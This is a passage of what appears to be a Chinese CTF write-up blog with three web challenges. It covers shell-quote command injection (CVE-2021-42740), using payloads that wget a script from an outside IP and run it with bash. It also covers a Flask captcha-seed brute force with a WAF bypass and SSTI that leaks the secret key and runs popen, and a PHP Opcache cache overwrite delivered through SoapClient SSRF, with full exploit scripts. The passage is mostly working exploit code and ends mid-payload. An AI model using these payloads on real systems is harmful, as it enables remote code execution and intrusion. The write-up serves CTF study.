spawn(&quot;bash&quot;, [&quot;-c&quot;, command]); console.log(command); nmap.on(&#x27;exit&#x27;, function (code) &#123; console.log(&#x27;child process exited with code &#x27; + code.toString()); if (code !== 0) &#123; res.send(`Error executing command!!!`); &#125; else &#123; res.send(`Ok...`); &#125; &#125;); &#125; else &#123; res.send(&#x27;No parameter provided.&#x27;); &#125;&#125;); 不多 bb, 就是打这个 checker 路由. 👴觉得 shellQuote,quote 很陌生，很不对劲，怎么办，搜 exp! 别跟👴说你不会搜，nmd 不要用国内的答辩引擎，上🥁🕊直接:shellQuote exploit 第一个就是了，其它都不好使:Exploiting CVE-2021-42740 (wh0.github.io) 不说人话:shell-quote 包通常用于转义不受信任的输入，以便在 shell 命令中使用。此示例采用不受信任的输入，引用它，并通过一个命令运行它，该命令将其打印出来。我们只希望它返回一个字符串，而不是允许不受信任的输入运行任意命令。假设我们在路径中调用 pwnme 了这个程序，如果它被执行，我们就失败了我们的安全目标： 有点难懂，来个 demo 试一下. 1return String(s).replace(/([A-z]:)?([#!&quot;$&amp;&#x27;()*,:;&lt;=&gt;?@\\[\\\\\\]^`&#123;|&#125;])/g, &#x27;$1\\\\$2&#x27;); 最好在虚拟机上用，test.js 如下 12345678const childProcess = require(&#x27;child_process&#x27;);const shellQuote = require(&#x27;shell-quote&#x27;);const untrusted = process.argv[2];console.log(&#x27;untrusted&#x27;, untrusted);const result = childProcess.execSync(shellQuote.quote([&#x27;printf&#x27;, &#x27;%s\\n&#x27;, untrusted]));console.log(&#x27;result&#x27;, result); 1node test.js &#x27;`:`./pwnme``:`&#x27; 这里的 1&#x27;`:`pwnme``:`&#x27; 相当于 untrsuted,👴直接就说了. pwnme 输入 123#!/bin/shtouch /tmp/i-am-pwnedecho &quot;oh no&quot; 输入命令 1node test.js &#x27;`:`./pwnme``:`&#x27; 直接就能执行 pwnme 里面的内容了 空格被 ban 怎么办，用 $IFS, 别这也要👴教. 你现在明白了怎么绘世了. 1command = shellQuote.quote([&quot;nmap&quot;, &quot;-p&quot;, port, host]); 现在也就是要控制 port 了 1&quot;127.0.0.1:`:`wget$IFS``:` $IFS 1%20%09%0A%00%0A $9 1%09 先下载 1http://124.70.33.170:24001/checker?url=&quot;127.0.0.0:`:`wget$IFS$943.143.192.19:7777/a.sh``:` 报错并无关系，已经执行力. 再执行 1http://124.70.33.170:24001/checker?url=&quot;127.0.0.0:`:`bash$IFS$9a.sh``:` 芜湖，奥利安费，太 tm 爽了. 👴顺便说一下，用斜杠也能绕过 1http://124.70.33.170:24001/checker?url=&quot;127.0.0.0:`:`bash$IFS\\a.sh``:` story これは、わたしの物語🤣,wcsndm 题目环境没了，自己本地搭 docker. 不过问题不大，因为👴魔改了一下源码，一样能和题目效果差不多 1app.config[&#x27;SECRET_KEY&#x27;] = str(uuid.uuid4()) 为了保证题目密钥的随机性，👴改成了这 b 玩意，👴可太 nb 了 不多 bb, 先上源码，让👴来看看怎么个事😊 源码🤔 12345678910111213141516171819202122232425262728293031323334353637383940def captcha(): gen = Captcha(200, 80) buf , captcha_text = gen.generate() session[&#x27;captcha&#x27;] = captcha_text return buf.getvalue(), 200, &#123; &#x27;Content-Type&#x27;: &#x27;image/png&#x27;, &#x27;Content-Length&#x27;: str(len(buf.getvalue())) &#125; @app.route(&#x27;/vip&#x27;, methods=[&#x27;POST&#x27;])def vip(): captcha = generate_code() captcha_user = request.json.get(&#x27;captcha&#x27;, &#x27;&#x27;) if captcha == captcha_user: session[&#x27;vip&#x27;] = True return render_template(&quot;home.html&quot;)@app.route(&#x27;/story&#x27;, methods=[&#x27;GET&#x27;])def story(): story = session.get(&#x27;story&#x27;,&#x27;&#x27;) if story is not None and story != &quot;&quot;: tpl = open(&#x27;templates/story.html&#x27;, &#x27;r&#x27;).read() return render_template_string(tpl % story) return redirect(&quot;/&quot;) @app.route(&#x27;/write&#x27;, methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])def rename(): if request.method == &quot;GET&quot;: return redirect(&#x27;/&#x27;) story = request.json.get(&#x27;story&#x27;, &#x27;&#x27;) if session.get(&#x27;vip&#x27;, &#x27;&#x27;): if not minic_waf(story): session[&#x27;username&#x27;] = &quot;&quot; session[&#x27;vip&#x27;] = False return jsonify(&#123;&#x27;status&#x27;: &#x27;error&#x27;, &#x27;message&#x27;: &#x27;no way~~~&#x27;&#125;) session[&#x27;story&#x27;] = story return jsonify(&#123;&#x27;status&#x27;: &#x27;success&#x27;, &#x27;message&#x27;: &#x27;success&#x27;&#125;) return jsonify(&#123;&#x27;status&#x27;: &#x27;error&#x27;, &#x27;message&#x27;: &#x27;Please become a VIP first.&#x27;&#125;), 400 👴只放了三个路由，不是懒，而是没有必要，你用不着这么多了🤣 很明显，最终利用点就是 story 路由下的 render_template_string, 众所周知，这是 SSTI 的触发点. 但是参数是从 session 里面取出来的，你能伪造吗，那怎么说也得拿到 SECRET_KEY 啊，怎么拿到呢，通过 stroy 路由 ssti拿到，那我怎么 ssti, 先伪造 session, 那我怎么伪造 session, 先拿到 SECRET_KEY, 那我怎么拿到 SCECRET_KEY 呢，先 ssti… 坑爹呢！这是，😓(bushi) 好吧，正解其实是: 通过 write 路由写 session 的 story, 但是 write 路由利用有个条件，要伪造 vip, 那怎么伪造 vip, 那必然是先拿到 SECRET_KEY… 我说婷婷，打住，没完了是吧🤪. vip 路由下能够让我们 session 中的 vip 为 true 1234567def vip(): captcha = generate_code() captcha_user = request.json.get(&#x27;captcha&#x27;, &#x27;&#x27;) if captcha == captcha_user: session[&#x27;vip&#x27;] = True return render_template(&quot;home.html&quot;)@app.route(&#x27;/story&#x27;, methods=[&#x27;GET&#x27;]) 不过条件是 generate_code 等于传入的 captcha, 而 generate_code 的生成逻辑是随机的四位，而且每访问一次都会变，直接爆破的人建议魔法披风. 我看看这个 captcha 的生成是怎么个事 123def generate_code(length: int = 4): characters = &#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27; return &#x27;&#x27;.join(random.choice(characters) for _ in range(length)) 这玩个 p 啊，随机生成，我看看这个 class 怎么个事 12345678910111213class Captcha: lookup_table: t.List[int] = [int(i * 1.97) for i in range(256)] def __init__(self, width: int = 160, height: int = 60, key: int = None, length: int = 4, fonts: t.Optional[t.List[str]] = None, font_sizes: t.Optional[t.Tuple[int]] = None): self._width = width self._height = height self._length = length self._key = (key or int(time.time())) + random.randint(1,100) self._fonts = fonts or DEFAULT_FONTS self._font_sizes = font_sizes or (42, 50, 56) self._truefonts: t.List[FreeTypeFont] = [] random.seed(self._key) 哦，原来是有种子的呀，那没事了 (nmsl). 这种子是当前时间戳的取证拼接 1 到 100 的随机数. 显然 time 我们可以自己本地生成，1 到 100 的随机数，凹概率你不会？爆破他个几百上千次，总能终出的. 终出不了也别干了，机器爆破这么多次，1 到 100 总得终出吧.🥵 12345678910def captcha(): gen = Captcha(200, 80) buf , captcha_text = gen.generate() session[&#x27;captcha&#x27;] = captcha_text return buf.getvalue(), 200, &#123; &#x27;Content-Type&#x27;: &#x27;image/png&#x27;, &#x27;Content-Length&#x27;: str(len(buf.getvalue())) &#125; @app.route(&#x27;/vip&#x27;, methods=[&#x27;POST&#x27;]) 为此我们需要访问 captcha, 每次以当前时间戳 + 随机数为种子重置这个对象，所以要先访问 captch, 再访问 /vip. 流程是 1重置Captcha对象,以当前时间戳加1至100随机数-&gt;gen.generate()生成第一次随机数-&gt;/vip路由调用generate_code随机生成 因此，我们也需要对轴 1234gen = Captcha(200, 80, int(time.time()) + random.randint(1, 100)) gen.generate() requests.get(url1 + &quot;captcha&quot;, headers=headers) 首先完成这些操作，然后访问 captcha 路由，此时轴对上了 1captcha = generate_code() 接下来生成一次 generate_code (), 并且访问 vip, 此时步调一致了，倘若种子一样，这样的请求不到 1 秒能完成，不会改变时间戳，那么本地生成的 code 和题目一样，就能够拿到 vip 了 今は👴の勝利だ これが👴の最後のエクスポート！ 1234567891011121314151617181920212223242526272829303132333435363738394041import randomimport requestsfrom utils.captcha import Captcha,generate_codeimport timeurl1 =&quot;http://127.0.0.1:15000/&quot;url2 = &quot;http://127.0.0.1:5001/&quot;while 1: headers=&#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;, &quot;Connection&quot;:&quot;close&quot; ,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Accept-Language&quot;:&quot;en&quot;,&quot;Accept&quot;:&quot;*/*&quot; &#125; # timekey = int(time.time()) gen = Captcha(200, 80, int(time.time()) + random.randint(1, 100)) gen.generate() captcha = generate_code() requests.get(url1 + &quot;captcha&quot;, headers=headers) # rawBody = &quot;&#123;\\&quot;captcha\\&quot;:\\&quot;&quot;+captcha+&quot;\\&quot;&#125;&quot; json = &#123;&quot;captcha&quot;: captcha&#125; # print(&quot;json:&quot; + f&quot;&#123;json&#125;&quot;) session = requests.session() headers2 = &#123;&quot;Accept&quot;: &quot;*/*&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;en&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;&#125; cookies = &#123;&quot;session&quot;: &quot;eyJjYXB0Y2hhIjoidHBUViJ9.ZUDlMw.Iwx2YVR3CqHYbpqySJWOEJX1hac&quot;&#125; res = session.post(url1 + &quot;vip&quot;, json=json, headers=headers, cookies=cookies) try: print(res.headers[&#x27;Set-Cookie&#x27;]) break except: continue 因为爆破，凹概率，循环跑就行 哈哈哈！👴は一番の天才だ 有 waf, 面白い！ 123456789101112131415rule = [ [&#x27;\\\\x&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;.&#x27;,&#x27;getitem&#x27;,&#x27;print&#x27;,&#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;getattribute&#x27;,&#x27;config&#x27;], # rule 1 [&#x27;(&#x27;,&#x27;]&#x27;,&#x27;getitem&#x27;,&#x27;_&#x27;,&#x27;%&#x27;,&#x27;print&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\\&#x27;&#x27;,&#x27;\\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;join&#x27;,&#x27;.&#x27;,&#x27;set&#x27;], # rule 2 [&#x27;\\&#x27;&#x27;,&#x27;\\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;config&#x27;,&#x27;join&#x27;,&#x27;\\\\x&#x27;,&#x27;)&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;attr&#x27;,&#x27;__&#x27;,&#x27;list&#x27;,&#x27;globals&#x27;,&#x27;.&#x27;], # rule 3 [&#x27;[&#x27;,&#x27;)&#x27;,&#x27;getitem&#x27;,&#x27;request&#x27;,&#x27;.&#x27;,&#x27;|&#x27;,&#x27;config&#x27;,&#x27;popen&#x27;,&#x27;dict&#x27;,&#x27;doc&#x27;,&#x27;\\\\x&#x27;,&#x27;_&#x27;,&#x27;\\&#123;\\&#123;&#x27;,&#x27;mro&#x27;], # rule 4 [&#x27;\\\\x&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;\\&#123;\\&#123;&#x27;,&#x27;.&#x27;,&#x27;request&#x27;,&#x27;|&#x27;,&#x27;attr&#x27;], # rule 5 [&#x27;print&#x27;, &#x27;class&#x27;, &#x27;import&#x27;, &#x27;eval&#x27;, &#x27;__&#x27;, &#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\\\\x&#x27;,&#x27;getitem&#x27;] # rule 6]def minic_waf(input): waf_seq = random.sample(range(21),3) for index in range(len(waf_seq)): waf_seq[index] = transfrom(waf_seq[index]) if not singel_waf(input, rule[waf_seq[index]]): return False return True 规则比较独特，六个规则随机生成三个，其实只需满足一条就行，同样是凹概率. 这种 ssti 随便打，拿个密钥先. 1234567891011121314151617181920import requestsurl1 =&quot;http://127.0.0.1:15000/&quot;data = &#123;&quot;story&quot;:&quot;&#123;&#123;config&#125;&#125;&quot;&#125;cookies = &#123;&quot;session&quot;:&quot;eyJ2aXAiOnRydWV9.ZUHlMg.eUH9ICmOx6JUujFsb8MxYu4QkOE&quot;&#125;session = requests.session()while 1: res = requests.post(url=url1+&quot;write&quot;,json=data,cookies=cookies) if &quot;success&quot; in res.text: cookie = res.headers[&#x27;Set-Cookie&#x27;].split(&quot;=&quot;)[1].split(&quot;;&quot;)[0] print(cookie) res2 = requests.get(url=url1+&quot;story&quot;,cookies = &#123;&quot;session&quot;:cookie&#125;) print(res2.text) break 这种爆破对👴来说还是太简单了，随随便便写个脚本冲了 拿到密钥能干很多事了， 123456app.config[&#x27;SECRET_KEY&#x27;] = &#x27;6e409b39-94e4-4557-9549-961bafdebf98&#x27;@app.route(&#x27;/story&#x27;, methods=[&#x27;GET&#x27;])def session_get(): session[&#x27;story&#x27;] = &quot;&#123;&#123;url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;&quot; return session[&#x27;story&#x27;] 👴不想跑 flasksession 脚本，太懒了，费劲，😡,👴就直接在路由里面设置了. eeeeeeeeez! 其它简单的题，👴不想动了. 终于🐛完了，好📕👚啊 これが君の知らない物語","categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"https://1llustrious.github.io/tags/WP/"},{"name":"复现","slug":"复现","permalink":"https://1llustrious.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"CTF","slug":"CTF","permalink":"https://1llustrious.github.io/tags/CTF/"}]},{"title":"关于DAS的小记","slug":"关于DAS的小记","date":"2023-12-01T01:10:33.000Z","updated":"2023-12-02T00:51:06.422Z","comments":true,"path":"2023/12/01/关于DAS的小记/","link":"","permalink":"https://1llustrious.github.io/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/","excerpt":"","text":"写在前面 Single_php Opcache SoapClient Ezfastjson Nomap 参考文献😊 调用链 writeObject 内存马 kali_tips 写在前面 这次 DAS 是我们 0psu3 成员出的题，这也是我第一次出题给各位师傅做，有出得不好的地方还希望师傅们轻点喷😭😭😭. 我出的是 Single_php , 一开始只是想出一个 Opcache 扩展漏洞的，通过文件上传到 /tmp 目录下覆盖的，后来在思考，怎么给师傅们 phpinfo, 于是我就想起了可以通过数组的形式调用任意无参方法，于是我又改了一下，打算配套整个 SSRF, 众所周知，调用 SoapClient 不存在的方法，就可以打 SSRF, 通过 UA 进行报文伪造，而且又涉及到文件上传，压缩包的数据在报文里面一般都是乱码，伪造起来比较麻烦，于是我通过 python 发包，获取 body, 于是就有了这道题的打法. 另外本文中，我还会整一个 Ezfastjson 的内容，分享一些微不足道的小知识，还请师傅们手下留情. Single_php 这道题的最终结果意想不到，我预计难度中等，想着几个简单的知识点凑一块可能会被打烂，但完全出乎意料. 该题目叫 Single_php 完全是我夹带私货，多少有点个人恩怨了😅 ?LuckyE=highlight_file 获得源码 企业，我的企业斯哈斯哈🥵🥵🥵🥵 但是，我已经单身 19 年了，而身边的人都已经脱单了～～，我要复仇！！！(bushi)~~ 尤其是某 S 开头的师傅. 这就能看到源码了，是不是很简单😊😊😊 123456789101112&lt;?php error_reporting(0); class siroha&#123; public $koi; public function __destruct()&#123; $this-&gt;koi[&#x27;zhanjiangdiyishenqing&#x27;](); &#125; &#125; $kanozyo = $_GET[&#x27;LuckyE&#x27;](__FILE__); var_dump($kanozyo); $suki = unserialize($_POST[&#x27;suki&#x27;]); 你看，源码就这么点内容. 已经能对当前文件进行操作，不过为了防止师傅们乱搞，防止一些奇奇怪怪非预期，我将当前目录设置为只读了🤣, 真不是我懒. 信息搜集提示还有个文件 siranai.php (希腊奶哟) 这可是通过 SSRF 触发文件上传涅🥰🥰 软链接？似乎不行，目录穿越？也不行，都说了当前目录只读，能操控的只有 /tmp 目录了. 不过有个 phpinfo, 还是要继续信息搜集 12345678class siroha&#123; public $koi;&#125;$a = new siroha();$a-&gt;koi = [&quot;zhanjiangdiyishenqing&quot;=&gt;&quot;phpinfo&quot;];echo urlencode(serialize($a)); 哦，有个扩展，这个扩展是有漏洞的. Opcache 具体来说，就是在 /tmp 某一特定目录下，放了缓存文件，访问 index.php 的时候，会加载这个缓存文件，从而展示页面. 但是，如果缓存文件被篡改，就会变成其它 php 代码，而我们要做的就是通过 tar 文件上传，覆盖掉原本的缓存文件，从而写入一句话. 完成这个利用，需要几个要素: index.php 的最后的时间戳 当前 php 的 systemid. 这个 systemid 的计算脚本简化如下: 1sys_id = hashlib.md5(&quot;8.2.10API420220829,NTSBIN_4888(size_t)8\\002&quot;.encode(&quot;utf-8&quot;)).hexdigest() 根据 php 版本改变. 系统会根据缓存文件的时间戳，判定其有效性，如果时间戳不对，就会删掉缓存文件并重新生成一份，于是我们就需要伪造. 那怎么获取时间戳呢， $_GET['LuckyE'](__FILE__) 除了获取源码之外，还能够获取时间戳. 本地起个相同 php 版本的 docker, 安装扩展. 1docker-php-ext-configure opcache --enable-opcache &amp;&amp; docker-php-ext-install opcache 获取的时间戳，转为十六进制，然后两位两位的倒这放进去 也可以写个脚本修改 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import binasciiimport hashlibimport requestsimport reimport tarfileimport subprocessimport osurl = &quot;http://43.143.192.19:1145/?LuckyE=filectime&quot;def timec(): pattern = r&quot;\\d&#123;10&#125;&quot; timeres = requests.get(url=url) match = re.search(r&#x27;int\\((\\d&#123;10&#125;)\\)&#x27;, timeres.text) # 检查是否有匹配 try: # 提取匹配到的数字 ten_digit_number = match.group(1) print(ten_digit_number) return ten_digit_number except: print(&#x27;dame&#x27;)def split_string_into_pairs(input_string): # 检查输入字符串的长度 if len(input_string) % 2 != 0: raise ValueError(&quot;输入字符串的长度必须是偶数。&quot;) # 使用切片操作将字符串分割成两位一组的子字符串 pairs = [input_string[i:i+2] for i in range(0, len(input_string), 2)] return pairsdef totime(time): b = split_string_into_pairs(f&quot;&#123;hex(int(time))&#125;&quot;) b.pop(0) s = &#x27;&#x27; for i in range(0, len(b)): s += b[-1] b.pop(-1) return sdef changetime(): with open(&quot;index.php.bin&quot;,&quot;rb&quot;) as file: binary_data = file.read() # 将二进制数据转换为十六进制字符串 hex_data = binascii.hexlify(binary_data).decode(&#x27;utf-8&#x27;) new_data = hex_data[0:128]+totime(timec())+hex_data[136:] with open(&quot;index.php.bin&quot;,&quot;wb&quot;) as f: f.write(bytes.fromhex(new_data))changetime() 修改完时间戳后，就可以打包 tar 了 12345678910def tar_file(): tar_filename = &#x27;exp.tar&#x27; with tarfile.open(tar_filename,&#x27;w&#x27;) as tar: directory_info = tarfile.TarInfo(name=f&#x27;&#123;sys_id&#125;/var/www/html&#x27;) directory_info.type = tarfile.DIRTYPE directory_info.mode = 0o777 tar.addfile(directory_info) tar.add(&#x27;index.php.bin&#x27;, arcname=f&#x27;&#123;sys_id&#125;/var/www/html/index.php.bin&#x27;) 这里为了方便，还是写了个脚本。设置 777 权限也是为了在 /tmp 目录下写进去. 最后就是触发 SSRF 了，由于涉及到 SoapClient 的 UA 注入，而且 tar 包有二进制数据，处理起来比较麻烦. 这里我就直接通过 python 获取了，很方便，👴真 tmd 是个天才！！！ 12345678910111213141516171819202122def tar_file(): tar_filename = &#x27;exp.tar&#x27; with tarfile.open(tar_filename,&#x27;w&#x27;) as tar: directory_info = tarfile.TarInfo(name=f&#x27;&#123;sys_id&#125;/var/www/html&#x27;) directory_info.type = tarfile.DIRTYPE directory_info.mode = 0o777 tar.addfile(directory_info) tar.add(&#x27;index.php.bin&#x27;, arcname=f&#x27;&#123;sys_id&#125;/var/www/html/index.php.bin&#x27;)tar_file()def upload(): file = &#123;&quot;file&quot;:(&quot;exp.tar&quot;,open(&quot;exp.tar&quot;,&quot;rb&quot;).read(),&quot;application/x-tar&quot;)&#125; res = requests.post(url=url,files=file) print(res.request.headers) return res.requestrequest_content = upload()upload_body = str(request_content.body).replace(&quot;\\&quot;&quot;,&quot;\\\\\\&quot;&quot;)content_length = request_content.headers[&#x27;Content-Length&#x27;]print(content_length)print(upload_body) SoapClient 12345678910111213141516171819&lt;?phpclass siroha&#123; public $koi;&#125;$postdata = &quot;--0f9486e921f5468f9ab50745c4c93267\\r\\nContent-Disposition: form-data; name=\\&quot;file\\&quot;; filename=\\&quot;exp.tar\\&quot;\\r\\nContent-Type: application/x-tar\\r\\n\\r\\n214510e772fba140ea7a33a277f2799e/var/www/html/\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x000000777\\x000000000\\x000000000\\x0000000000000\\x0000000000000\\x00014543\\x00 5\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00ustar\\x0000\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00././@PaxHeader\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x000000000\\x000000000\\x000000000\\x0000000000034\\x0000000000000\\x00010212\\x00 x\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00ustar\\x0000\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0028 mtime=1696745575.7742124\\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\